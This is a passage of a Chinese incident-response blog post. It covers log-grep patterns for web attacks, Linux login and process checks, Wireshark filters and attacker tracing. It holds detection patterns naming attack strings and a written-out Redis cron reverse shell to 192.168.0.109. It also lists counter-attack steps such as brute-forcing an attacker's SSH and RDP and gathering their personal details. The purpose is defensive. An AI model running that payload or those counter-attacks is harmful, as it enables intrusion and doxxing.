class="line">xargs:用于将输入转换为命令行参数，并执行后面的命令。</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">(1)SQL注入检攻击检测</span><br><span class="line">grep -E -i "select" log1</span><br><span class="line">-E：这个选项表示使用扩展的正则表达式 (Extended Regular Expression)。这使您能够使用一些额外的正则表达式特性，例如 +、? 等。</span><br><span class="line">-i：此选项表示不区分大小写，即在搜索时 "select" 会匹配 "SELECT"、"Select" 等不同大小写的形式。</span><br><span class="line"></span><br><span class="line">(2)xss跨站脚本攻击检测</span><br><span class="line">grep -E -i " (S)%26%23x3c%3B(S+)%3E|(S)%26%23x3c%3B(S+)%2F%3E|(S+)&amp;#x3c;(S+)&gt;|(S+)&amp;#x3c;(S+)/" log1</span><br><span class="line"></span><br><span class="line">(S)%26%23x3c%3B(S+):</span><br><span class="line">%26%23x3c 是 HTML 实体，表示 &lt; 符号。也就是说，该部分寻找形如 S&lt;S+ 的字符串。</span><br><span class="line">|: 逻辑“或”操作符，用于连接多个表达式。</span><br><span class="line">(S)%26%23x3c%3B(S+)/:</span><br><span class="line">这个部分类似于前面的，但它表示寻找形如 S&lt;S+/ 的字符串（即自闭合标签）。</span><br><span class="line">(S+)&amp;#x3c;(S+)&gt;:</span><br><span class="line">这里找到的是 S&lt;S+&gt; 的形状，这里 &amp;#x3c; 同样表示 &lt;。</span><br><span class="line">(S+)&amp;#x3c;(S+)/:</span><br><span class="line">F这个部分寻找传递形如 S&lt;S+/ 的字符串。</span><br><span class="line"></span><br><span class="line">(3)命令注入攻击攻击检测</span><br><span class="line">grep -E -i "ping%20-c%20|ls%20|cat%20|%20pwd|net user" log1</span><br><span class="line"></span><br><span class="line">(4)网站被植入webshell后门检测</span><br><span class="line">grep -E -i "eval|%eval|%execute|%3binsert|%20makewebtaski|/1.asp|/1.jsp|/1.php|/1.aspx %if" log1</span><br><span class="line"></span><br><span class="line">(5)暴力破解账号攻击检测</span><br><span class="line">grep -E -i "login" /www/logs/access.log | grep -E -i "POST" | grep -E -i "200"</span><br></pre></td></tr></tbody></table></figure><h4 id="系统日志-1"><a href="#系统日志-1" class="headerlink" title="系统日志"></a>系统日志</h4><table><thead><tr><th align="center">日志文件</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">/var/log/cron</td><td align="center">定时任务相关日志</td></tr><tr><td align="center">/var/log/cups</td><td align="center">打印信息的日志</td></tr><tr><td align="center">/var/log/dmeslog</td><td align="center">系统在开机时内核自检的信息</td></tr><tr><td align="center">/var/log/auth.log</td><td align="center">系统授权信息，用户登录和使用的权限机制等</td></tr><tr><td align="center">/var/log/message</td><td align="center">系统重要信息的日志</td></tr><tr><td align="center">/var/log/btmp</td><td align="center">错误登录日志</td></tr><tr><td align="center">/var/log/lastlog</td><td align="center">系统中所有用户最后一次登录时间的日志</td></tr><tr><td align="center">/var/log/wtmp</td><td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件</td></tr><tr><td align="center">/var/log/utmp</td><td align="center">当前已经登录的用户信息</td></tr></tbody></table><p>系统安全安全日志</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/secure Centos</span><br><span class="line"></span><br><span class="line">Apr 17 10:25:37 VM-0-17-centos sshd[18083]:Accepted publickey for root from 45.79.126.79 port 5729 ssh2: RSA SHA256:av1LzEMVmLIn1gDyaaMc8LWyqx6KGLzjRa57Zvx7+ac</span><br><span class="line">-Apr1710:25:37：事件发生的日期和时间，以月、日、小时和分钟的格式表示。</span><br><span class="line">-VM-0-17-centos：事件发生的机器的主机名。</span><br><span class="line">-sshd[18083]:服务的名称(sshd）和与事件相关的进程ID(18083）。</span><br><span class="line">-Acceptedpublickey：公钥身份验证成功。</span><br><span class="line">-for root：验证的用户帐户是root。</span><br><span class="line">-from 45.79.126.79 port 5729 ssh2:来自IP地址45.79.126.79且SSH连接的端口是5729。</span><br><span class="line"></span><br><span class="line">查找每个IP地址的失败登录次数：</span><br><span class="line">awk '/sshd.*Failed/{print $(NF-3)}' /var/log/secure | sort | uniq -c| sort -nr</span><br><span class="line"></span><br><span class="line">查找特定IP地址的失败登录：</span><br><span class="line">grep "sshd.*Failed.*from &lt;IP_ADDRESS&gt;" /var/log/secure | awk '{print $1,$2,$3,$9,$11}'</span><br><span class="line"></span><br><span class="line">查找特定IP地址的成功登录：</span><br><span class="line">grep "sshd.*Accepted.*from &lt;IP_ADDRESS&gt;" /var/log/secure | awk '{print $1,$2,$3,$9,$11}'</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cat /var/log/auth.log Ubuntu</span><br><span class="line"></span><br><span class="line">vim /etc/rsyslog.conf 查看日志存放位置</span><br></pre></td></tr></tbody></table></figure><p>比较重要的几个日志</p><p>登陆失败记录：/var/log/btmp //输入lastb直接查看</p><p>登陆成功记录：/var/log/wtmp //输入last直接查看</p><p>目前登陆用户信息：/var/log/utmp </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">last 命令：</span><br><span class="line">功能说明：列出目前与过去登入系统的用户相关信息。</span><br><span class="line">　　语　　法：last [-adRx][-f ][-n ][帐号名称...][终端机编号...]</span><br><span class="line">　　补充说明：单独执行last指令，它会读取位于/var/log目录下，名称为wtmp的文件，并把该给文件的内容记录的登入系统的用户名单全部显示出来。</span><br><span class="line">　　参　　数：</span><br><span class="line">　　-a 　把从何处登入系统的主机名称或IP地址，显示在最后一行。</span><br><span class="line">　　-d 　将IP地址转换成主机名称。</span><br><span class="line">　　-f  　指定记录文件。</span><br><span class="line">　　-n 或- 　设置列出名单的显示列数。</span><br><span class="line">　　-R 　不显示登入系统的主机名称或IP地址。</span><br><span class="line">　　-x 　显示系统关机，重新开机，以及执行等级的改变等信息。</span><br></pre></td></tr></tbody></table></figure><p>密码验证失败</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep "Fail password" /var/log/auth.log | wc -l</span><br></pre></td></tr></tbody></table></figure><p>密码验证成功</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep "Accepted password for" /var/log/auth.log</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i:22//查看是否开启22端口</span><br></pre></td></tr></tbody></table></figure><p>查看每个ip失败的次数</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">grep "Failed password" /var/log/auth.log | awk '(if (NF==16) {c[$13]++}else{c[$11]++}}END{for(u in c)print u,c[u]}' | sort -k 2 -nr | head</span><br><span class="line"></span><br><span class="line">grep "Failed password" /var/log/auth.log:</span><br><span class="line">从 /var/log/auth.log 文件中提取包含 "Failed password" 的所有行。这通常表示登录失败的尝试。</span><br><span class="line">awk '(if (NF==16) {c[$13]++}else{c[$11]+ }):</span><br><span class="line">awk 命令用于处理文本行。在这里，使用 NF 变量（表示当前行的字段数）来判断行的结构。如果字段数为 16，则增加关联数组 c 中，以 \$13（通常表示失败尝试的用户名或 IP 地址）为索引的计数。如果字段数不是 16，则使用 \$11（通常表示失败尝试的用户名或 IP 地址）来增加计数。</span><br><span class="line">END{for(u in c)print u,c[u]}:</span><br><span class="line">在处理完所有输入后，输出数组 c 的内容，打印每个用户名（或 IP 地址）及其对应的失败登录尝试次数。</span><br><span class="line">sort -k 2 -nr:</span><br><span class="line">对输出进行排序，按第二列（即失败尝试次数）进行降序排序。</span><br><span class="line">head:</span><br><span class="line">显示排序后的前几行（默认是 10 行），这些行显示了最频繁的失败密码尝试者。</span><br></pre></td></tr></tbody></table></figure><p>查看每个用户名失败的次数</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep "Failed password" /var/log/auth.log | awk '{if (NF==16) {c[$11]++}else{c[$9]++}}END{for(u in c)print u,c[u]}' | sort -k 2 -nr | head</span><br></pre></td></tr></tbody></table></figure><p>查看是否有与uid=0的（与root同权限的用户）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F: '$3==0{print $1}' /etc/passwd</span><br></pre></td></tr></tbody></table></figure><p>查看是否有空口令账户</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F: 'length($2)==0 {print $1}' /etc/shadow</span><br></pre></td></tr></tbody></table></figure><h3 id="进程分析-1"><a href="#进程分析-1" class="headerlink" title="进程分析"></a>进程分析</h3><h4 id="进程和网络连接状态"><a href="#进程和网络连接状态" class="headerlink" title="进程和网络连接状态"></a>进程和网络连接状态</h4><p>网络连接命令netstat</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-a: 显示所有连接和监听的端口。</span><br><span class="line">-t: 显示 TCP 连接。</span><br><span class="line">-u: 显示 UDP 连接。</span><br><span class="line">-l: 仅显示在监听状态的服务。</span><br><span class="line">-n: 以数字形式显示地址和端口号，而不是尝试解析服务名。</span><br><span class="line">-p: 显示哪个进程在使用该 socket（需要 root 权限）。</span><br><span class="line">-r: 显示路由表。</span><br><span class="line">-i: 显示网络接口的信息。</span><br><span class="line">-s: 显示网络统计信息。</span><br><span class="line">-c: 持续输出网络状态，直到手动停止（Ctrl+C）。</span><br><span class="line"></span><br><span class="line">## netstat -antp</span><br></pre></td></tr></tbody></table></figure><p>查看可疑进程的对应可执行程序</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">## ls -alt /proc/PID</span><br></pre></td></tr></tbody></table></figure><p>查看可疑进程打开了哪些文件</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">## lsof -p PID </span><br><span class="line">lsof(List Open Files): 命令本身，用于列出当前系统中打开的文件。</span><br><span class="line">-p: 这个选项后接一个进程 ID (PID)，用于指定要查询的特定进程。</span><br><span class="line">PID: 代表进程 ID，是一个数字，指的就是你想查看的进程的具体 ID。</span><br><span class="line">运行 lsof -p PID 可以帮助你了解该进程打开了哪些文件，包括常规文件、设备文件、网络套接字等。这在排查问题、监控进程状态和进行系统性能调优时非常有用。</span><br></pre></td></tr></tbody></table></figure><p>查看隐藏进程</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">## ps -ef | awk '{print}' | sort -n | uniq &gt; 1</span><br><span class="line"></span><br><span class="line">ps -ef:</span><br><span class="line">这个命令用于列出当前系统中的所有进程，-e 选项表示显示所有用户的进程，-f 选项表示以完整格式显示。这将输出每个进程的详细信息。</span><br><span class="line">|:</span><br><span class="line">管道符用于将左侧命令的输出作为右侧命令的输入。</span><br><span class="line">awk '{print}':</span><br><span class="line">awk 是一个文本处理工具。在这里，'{print}' 将输入的每一行打印出来。实际上，这一步并没有改变输出，只是再次输出了 ps -ef 的结果。</span><br><span class="line">sort -n:</span><br><span class="line">sort 命令用于对输入进行排序。-n 选项表示按数值进行排序，但因为没有具体的排序字段，这一步可能不太有意义，尤其是在处理进程信息时。它会对整行进行字典排序。</span><br><span class="line">uniq:</span><br><span class="line">uniq 用于去除重复的行。由于 uniq 只能删除相邻的重复行，所以通常在此之前要使用 sort 命令，以确保相同的行在一起。</span><br><span class="line">&gt; 1:</span><br><span class="line">将最终的输出重定向到名为 1 的文件中。如果该文件已存在，则内容会被覆盖。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## ls /proc | sort -n | uniq &gt; 2</span><br><span class="line"></span><br><span class="line">ls /proc:</span><br><span class="line">ls 命令用于列出指定目录中的文件和子目录。在这个上下文中，它将列出 /proc 目录中的所有条目。/proc 是一个虚拟文件系统，包含关于当前系统进程和内核的信息。这里的输出通常会是许多进程 ID（数字）和一些其他系统信息（如 sys, self, uptime 等）。</span><br><span class="line">|:</span><br><span class="line">管道符，将 ls 的输出传递给下一个命令。</span><br><span class="line">sort -n:</span><br><span class="line">sort 命令用于对输入内容进行排序，-n 选项表示按数值顺序排序。这对于 /proc 目录下的数字（表示进程 ID）是合适的，因为它们可以根据数值大小进行有效排序。</span><br><span class="line">uniq:</span><br><span class="line">uniq 命令用于去除重复的行。由于 ls 输出的内容已经按照数字排序，因此 uniq 将删除相邻的重复行。虽然在通常情况下，/proc 目录中的文件条目不会有重复的进程 ID，但如果有其他类型的文件名重复，它也会被去掉。</span><br><span class="line">&gt; 2:</span><br><span class="line">这个部分用于将最终的输出重定向到名为 2 的文件中。如果文件 2 已存在，内容将被覆盖。如果文件不存在，则会创建一个新文件</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>计划任务路径</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/crontabs</span><br><span class="line">/var/spool/cron/root</span><br></pre></td></tr></tbody></table></figure><p>查看计划任务</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -u root -l</span><br></pre></td></tr></tbody></table></figure><p>redis写隐藏计划任务</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set shell "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.0.109/2222 0&gt;&amp;1\n\n"</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">crontab -u root -l 这个命令是无法查看redis这个隐藏计划任务的，只能去/var/spool/cron/root里查看</span><br></pre></td></tr></tbody></table></figure><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="#流量分析"></a>#流量分析</h2><h3 id="Wireshark的使用"><a href="#Wireshark的使用" class="headerlink" title="Wireshark的使用"></a>Wireshark的使用</h3><h5 id="网卡选择模式"><a href="#网卡选择模式" class="headerlink" title="网卡选择模式"></a>网卡选择模式</h5><p>开启混杂模式<br>局域网的所有流是都会发送给我们的电脑，默认情况下，我们的电脑只会对自己mac的流是进行解包，而丢弃其他mac的数据包。<br>开启混杂模式后，我们就可以解析其他mac的数据包，因此，我们使用Wireshark时，通常都会开启混杂模式。<br>点击菜单栏的[捕获」按钮，点击[选项]</p><h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h5><p>1、捕获过滤器</p><p>在抓包之前就设定好过滤条件，然后只抓取符合条件的数据包</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">过滤基本的语去格式：BPF语法格式。</span><br><span class="line">1）BPF语法</span><br><span class="line">BPF(全称Berkeley Packet Filter)，中文叫伯克利封包过滤器，它有四个核心元素：类型、方向、协议和逻辑运算符。</span><br><span class="line">1.类型Type:主机(host)、网段(net)、端口(port)</span><br><span class="line">2.方向Dir:源地址(src)、目标地址(dst)</span><br><span class="line">3.协议Proto:各种网络协议,比如:tcp、udp、http</span><br><span class="line">4.逻辑运算符:与（&amp;&amp;）、或（II）、非（！）</span><br><span class="line">四个元素可以自由组合，比如：</span><br><span class="line">1. src host 192.168.31.1:抓取源IP为192.168.31.1的数据包</span><br><span class="line">2. tcp || udp:抓取 TCP 或者 UDP 协议的数据包</span><br></pre></td></tr></tbody></table></figure><p>2、显示过滤器</p><p>在已捕获的数居包集合中设置过滤条件，隐藏不想显示的数据包，只显示符合条件的数据包。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">显示过滤器的语法包含5个核心元素：IP、端口、协议、比较运算符和逻辑运算符。</span><br><span class="line">1.IP地址:ip.addr、ip.src、ip.dst</span><br><span class="line">2.端口:tcp.port、tcp.srcport、tcp.dstport</span><br><span class="line">3.协议:tcp、udp、http</span><br><span class="line">4.比较运算符:&gt; &lt; == &gt;= &lt;= !=</span><br><span class="line">5.逻辑运算符：and、or、not、xor（有且仅有一个条件被满足)</span><br><span class="line"></span><br><span class="line">5个核心元案可以自由组合，比如：</span><br><span class="line">- ip.addr == 192.168.32.121:显示IP地址为192.168.32.121的数据包</span><br><span class="line">- tcp.port == 80：显示端口为80的数据包</span><br><span class="line">使用方法：在过滤栏输入过滤语句，修改后立即生效</span><br></pre></td></tr></tbody></table></figure><p>3、过滤器具体写法</p><p>显示过滤器写法</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、过滤值比较符号及表达式之间的组合</span><br><span class="line">2、针对ip的过滤</span><br><span class="line">3、针对协议的过滤</span><br><span class="line">4、针对端口的过滤（视传输协议而定)</span><br><span class="line">5、针对长度和内容的过滤</span><br><span class="line">5、针对http请求的一些过滤实例。</span><br></pre></td></tr></tbody></table></figure><p>捕捉过滤器写法</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、比较符号</span><br><span class="line">2、常用表达式实例</span><br></pre></td></tr></tbody></table></figure><p>注意：这两种过滤器所便用的语法是完全不同的，捕捉网卡数据的其实并不是Wireshark，而是WinPcap，当然要按WinPcap的规则来，显示过滤器就是Wireshark对已捕捉的数据进行筛选。</p><p>使用捕获过滤器的主要原因就是性能。如果你知道并不需要分析某个类型的流量，那么可以简单地便用捕获过滤器过滤掉它，从而节省那些会被用来捕获这些数据包的处理器资源。当处理大是数据的时候，使用捕获过滤器是相当好用的。</p><p>Wireshark拦截通过网卡访问的所有数据，前提是没有设置任何代理。Wireshark不能拦截本地回环访问的请求，即127.0.0.1或者localhost。</p><p>4、显示过滤器具体写法</p><ol><li>针对ip的过滤</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(1)源地址进行过滤</span><br><span class="line">ip.src == 192.168.0.1</span><br><span class="line"></span><br><span class="line">(2)对目的地址进行过滤</span><br><span class="line">ip.dst == 192.168.0.1</span><br><span class="line"></span><br><span class="line">(3)对源地址或者目的地址进行过滤</span><br><span class="line">ip.addr == 192.168.0.1</span><br><span class="line">如果想排除以上的数据包，只需要用括号，然后使用"!"即可</span><br><span class="line">!(ip.addr == 192.168.0.1)</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>针对协议的过滤</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(1)获某种协议的数据包，表达式很简单仅仅需要把协议的名字输入即可</span><br><span class="line">http</span><br><span class="line">注意：是区分大小写，只能为小写</span><br><span class="line">(2)捕获多种协议的数据包</span><br><span class="line">http or telnet</span><br><span class="line">(3)排除某种协议的数据包</span><br><span class="line">not arp 或者 !tcp</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>针对端口的过滤（视传输协议而定）</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(1)捕获某一端口的数据包(以tcp协议为例)</span><br><span class="line">tcp.port == 80</span><br><span class="line">(2)捕获多端口的数据包，可以使用and来连接，下面是捕获高于某端口的表达式（以udp协议为例）</span><br><span class="line">udp.port &gt;= 2048</span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>针对长度和内容的过滤</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(1)针对长度的过虑（这里的长度指定的是数据段的长度）</span><br><span class="line">udp.length &lt; 20http.content_length &lt;= 30s</span><br><span class="line">(2)针对uri内容的过滤</span><br><span class="line">http.request.uri matches 'user'(请求的uri中包含"user"关键字的)</span><br><span class="line">注意：matches后的关键字是不区分大小写的！</span><br><span class="line"></span><br><span class="line">http.request.uri contains 'user'(请求的uri中包含“user"关键字的)</span><br><span class="line">注意：contains后的关键字是区分大小写的！</span><br></pre></td></tr></tbody></table></figure><ol start="5"><li>针对http请求的一些过滤实例</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(1)过滤出请求地址中包含“user”的请求，不包括域名；</span><br><span class="line">http.request.uri contains 'user'</span><br><span class="line">(2)精确过滤域名</span><br><span class="line">http.host == baidu.com</span><br><span class="line">(3)模糊过滤城名</span><br><span class="line">http.host contains 'baidu'</span><br><span class="line">(4)过滤请求content_type类型</span><br><span class="line">http.content_type =='text/html'</span><br><span class="line">(5)过滤http请求方法</span><br><span class="line">http.request.method=='POST'</span><br><span class="line">(6)过滤tcp端口</span><br><span class="line">tcp.port == 80</span><br><span class="line">http &amp;&amp; tcp.port == 80 or tcp.port == 5566</span><br><span class="line">(7)过滤http响应状态码</span><br><span class="line">http.response.code == 302</span><br><span class="line">(8)过滤含有指定cookie的http数据包</span><br><span class="line">http.cookie contains 'userid'</span><br><span class="line"></span><br><span class="line">比较符号</span><br><span class="line">与:&amp;(and)</span><br><span class="line">或:|(or)</span><br><span class="line">非:！(not)</span><br><span class="line">实例:</span><br><span class="line">src or dst portrange 6000-8000 &amp;&amp; tcp or ip6</span><br></pre></td></tr></tbody></table></figure><h2 id="溯源的方法"><a href="#溯源的方法" class="headerlink" title="#溯源的方法"></a>#溯源的方法</h2><h3 id="入场前期工作"><a href="#入场前期工作" class="headerlink" title="入场前期工作"></a>入场前期工作</h3><h4 id="1-明确网络区域划分"><a href="#1-明确网络区域划分" class="headerlink" title="1 明确网络区域划分"></a>1 明确网络区域划分</h4><p>DMZ区、办公终端区、核心业务区、上下游公司、供应链接入区</p><h4 id="2-明确现有安全设备"><a href="#2-明确现有安全设备" class="headerlink" title="2 明确现有安全设备"></a>2 明确现有安全设备</h4><h5 id="设备类型"><a href="#设备类型" class="headerlink" title="设备类型"></a>设备类型</h5><p>网络层设备、终端层设备、蜜罐、日志汇总态势类</p><h5 id="设备覆盖范围"><a href="#设备覆盖范围" class="headerlink" title="设备覆盖范围"></a>设备覆盖范围</h5><h5 id="现有告警质量"><a href="#现有告警质量" class="headerlink" title="现有告警质量"></a>现有告警质量</h5><p>告警种类、告警误报评估</p><h4 id="3-已有资产梳理"><a href="#3-已有资产梳理" class="headerlink" title="3 已有资产梳理"></a>3 已有资产梳理</h4><h5 id="公网暴露资产"><a href="#公网暴露资产" class="headerlink" title="公网暴露资产"></a>公网暴露资产</h5><p>IP、域名、运行服务、中间件、账号口令、源码泄露、远程接入点（VPN、RDP、VNC、远程终端管理系统）</p><h5 id="内网资产"><a href="#内网资产" class="headerlink" title="内网资产"></a>内网资产</h5><p>IP、系统版本、开放服务、账号口令、重点关注资产（域控机器、运维人员机器、堡垒机、自动化运维、邮件系统、OA、wiki等）</p><h4 id="4-公司运营业务数据（防钓鱼）"><a href="#4-公司运营业务数据（防钓鱼）" class="headerlink" title="4 公司运营业务数据（防钓鱼）"></a>4 公司运营业务数据（防钓鱼）</h4><p>公司内部组织架构、上下游公司、运维 IT 财务 人事等部门信息 以及相关人员对接信息、通信手段 通信格式等</p><h3 id="溯源反制"><a href="#溯源反制" class="headerlink" title="溯源反制"></a>溯源反制</h3><p>从蜜罐收集到<strong>可疑的IP或域名</strong>后</p><h4 id="主动访问扫描探测"><a href="#主动访问扫描探测" class="headerlink" title="主动访问扫描探测"></a>主动访问扫描探测</h4><h5 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h5><p>通过ip扫描出的web页面</p><p>1、个人博客–昵称简介备案等信息</p><p>2、红队设施–弱口令、爆破、其他漏洞</p><h5 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h5><p>1、RDP</p><p>2、SSH爆破</p><p>3、FTP爆破</p><p>4、各类数据库（MySQL、MSSQL、Redis、MongoDB）</p><p>​</p><h4 id="情报搜集"><a href="#情报搜集" class="headerlink" title="情报搜集"></a>情报搜集</h4><h5 id="威胁情报、沙箱"><a href="#威胁情报、沙箱" class="headerlink" title="威胁情报、沙箱"></a>威胁情报、沙箱</h5><p>360、奇安信、微步</p><h5 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h5><p>1、百度、谷歌</p><p>2、fofa、zoomeye–历史资产服务、现有资产服务</p><h5 id="阿里云、腾讯云、华为云"><a href="#阿里云、腾讯云、华为云" class="headerlink" title="阿里云、腾讯云、华为云"></a>阿里云、腾讯云、华为云</h5><p>1、IP找回账号</p><p>2、域名找回账号</p><h5 id="IP定位"><a href="#IP定位" class="headerlink" title="IP定位"></a>IP定位</h5><p><a href="http://www.ipplus360.com/about/us">http://www.ipplus360.com/about/us</a></p><p>得到攻击者信息后</p><p>攻击者信息：虚拟IP、手机号码、姓名、邮箱、QQ号</p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
